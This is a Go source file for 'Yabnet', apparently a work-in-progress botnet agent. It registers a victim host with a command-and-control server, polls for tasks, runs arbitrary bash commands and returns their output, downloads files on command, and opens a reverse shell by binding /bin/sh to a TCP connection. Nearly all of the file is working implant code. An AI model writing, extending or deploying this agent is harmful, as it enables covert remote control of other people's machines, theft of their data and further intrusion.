/*
Yabnet's agent program, written in go.

Current file is in construction and in debugging mode. Still learning golang...
*/

package main

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"
)

// Global Variable Declaration
var SERVERIP string = "localhost"
var PORT string = "5000"
var FIRSTCONTACTKEY string = "firstcontactkey"
var URL string = "http://" + SERVERIP + ":" + PORT

func GetOutboundIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	localAddr := conn.LocalAddr().String()
	idx := strings.LastIndex(localAddr, ":")

	return localAddr[0:idx]
}

// Return error type for error checking?
// Think about os.Exit(1) in the error checking down below
func simplePost(endpoint string, data url.Values) map[string]interface{} {
	response, err := http.PostForm(endpoint, data)

	if err != nil {
		fmt.Println("[-] Error: ", err)
		os.Exit(1)
	}

	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)

	if err != nil {
		fmt.Println("[-] Error:", err)
		os.Exit(1)
	}

	responseBody := string(body)

	var jsonData map[string]interface{}
	json.Unmarshal([]byte(responseBody), &jsonData)

	//fmt.Println(jsonData["result"])

	return jsonData
}

func firstContact() string {
	endpoint := URL + "/firstcontact"

	var data = url.Values{"firstcontactkey": {FIRSTCONTACTKEY}}
	jsonData := simplePost(endpoint, data)

	if jsonData["result"] == "success" {
		return jsonData["registerkey"].(string)
	} else {
		return jsonData["result"].(string)
	}
}

func register(registerkey string, ip string, os_name string, user string) bool {
	endpoint := URL + "/register"

	var data = url.Values{
		"registerkey": {registerkey},
		"ip":          {ip},
		"os":          {os_name},
		"user":        {user}}

	jsonData := simplePost(endpoint, data)

	if jsonData["result"] == "success" {
		return true
	} else {
		fmt.Println(jsonData["error"])
		return false
	}
}

func heartbeat(registerkey string, ip string, user string) bool {
	endpoint := URL + "/heartbeat"

	var data = url.Values{
		"registerkey": {registerkey},
		"ip":          {ip},
		"user":        {user}}

	jsonData := simplePost(endpoint, data)

	if jsonData["result"] == "success" {
		return true
	} else {
		return false
	}

}

func fetchCommand(registerkey string, ip string) string {
	endpoint := URL + "/bot/" + ip + "/task"

	var data = url.Values{"registerkey": {registerkey}}

	jsonData := simplePost(endpoint, data)

	if jsonData["result"] == "success" {
		return jsonData["command"].(string)
	} else {
		return jsonData["error"].(string)
	}

}

/*
	Description: Executes commands that was fetched from the server.
	The commands are categorized as "upload", "download", "shell", and simple_exec.
	The function currently only supports simple_exec
*/

func submitResult(registerkey string, ip string, result string) {
	endpoint := URL + "/bot/" + ip + "/result"

	var data = url.Values{
		"registerkey": {registerkey},
		"result":      {result}}

	jsonData := simplePost(endpoint, data)
	fmt.Println(jsonData)
}

func reverseshell(serverip string, port string) {
	server := serverip + ":" + port
	conn, _ := net.Dial("tcp", server)
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func download(endpoint string, destination string) (err error) {
	resp, err := http.Get(endpoint)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	f, err := os.Create(destination)
	if err != nil {
		return
	}
	defer f.Close()

	_, err = io.Copy(f, resp.Body)
	return
}

/*
Description: Executes commands that was fetched from the server.
The commands are categorized as "upload", "download", "shell", and simple_exec.
The function currently only supports simple_exec
*/

// TODO: Work on this function
func executeCommand(command string) string {
	//argstr := []string("-c", command)
	//out, err := exec.Command("/bin/bash", argstr).Output()
	//if err != nil {
	//	fmt.Println(err)
	//}
	commandSlice := strings.Split(command, " ")

	// Download file and save it into the local disk
	if commandSlice[0] == "download" {
		fmt.Println("implement download here ")
		endpoint := URL + "/download/" + commandSlice[1]
		download(endpoint, commandSlice[2])
		return ""

		// Launch a reverse shell
	} else if commandSlice[0] == "shell" {
		port := commandSlice[1]
		go reverseshell(SERVERIP, port)
		return ""

		// Execute a simple bash command, and return the output to /result endpoint
	} else {
		out, err := exec.Command("/bin/bash", "-c", command).CombinedOutput()
		if err != nil {
			return err.Error() + string(out)
		}
		return string(out)
	}
}

func main() {
	ip := GetOutboundIP()
	user, _ := user.Current()
	os_name, _ := os.Hostname()
	username := user.Username

	registerkey := firstContact()
	fmt.Println("Reigster key = ", registerkey)

	register_result := register(registerkey, ip, os_name, username)

	// Register was not successful. Exit.
	if register_result == false {
		for i := 1; i < 5; i++ {
			registerkey := firstContact()
			register_result := register(registerkey, ip, os_name, username)
			if register_result == true {
				break
			}
			time.Sleep(10 * time.Second)
		}
	}

	// Register was successful
	for {
		heartbeat_result := heartbeat(registerkey, ip, username)

		// Heartbeat failed. Retry heartbeat.
		if heartbeat_result == false {
			for i := 1; i < 5; i++ {
				heartbeat_result := heartbeat(registerkey, ip, username)
				if heartbeat_result == true {
					break
				}
				time.Sleep(10 * time.Second)
			}
		}

		// Everything is fine. Try to fetch command.
		command := fetchCommand(registerkey, ip)

		if strings.Contains(command, "[-]") == true {
			fmt.Println("[-] Sleeping... ")
			time.Sleep(10 * time.Second)
			continue
		}

		fmt.Println("Command: ", command)
		execute_result := executeCommand(command)
		fmt.Println("[+] Result: ", execute_result)
		submitResult(registerkey, ip, execute_result)

		time.Sleep(10 * time.Second)

	}

}
